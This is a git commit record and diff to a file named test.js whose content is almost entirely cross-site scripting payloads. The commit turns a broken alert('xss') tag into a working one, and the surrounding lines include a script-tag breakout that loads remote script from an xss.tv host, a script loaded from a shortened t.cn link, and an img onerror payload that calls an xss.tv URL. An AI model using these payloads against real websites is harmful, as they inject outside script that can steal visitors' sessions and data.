533438d82067d80ae780d0c0348f88bbbff2915b
FalconSecurity <securlty@163.com>
2016-05-21 00:24:48 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
-<scrip>alert('xss')</script>
+<script>alert('xss')</script>
 </script><script src=http://xss.tv/rBBuXa></script>
 <script src=http://t.cn/R5v2SAy></script>
 <img src=1 onerror=$.get('http://xss.tv/dTQ19c')>
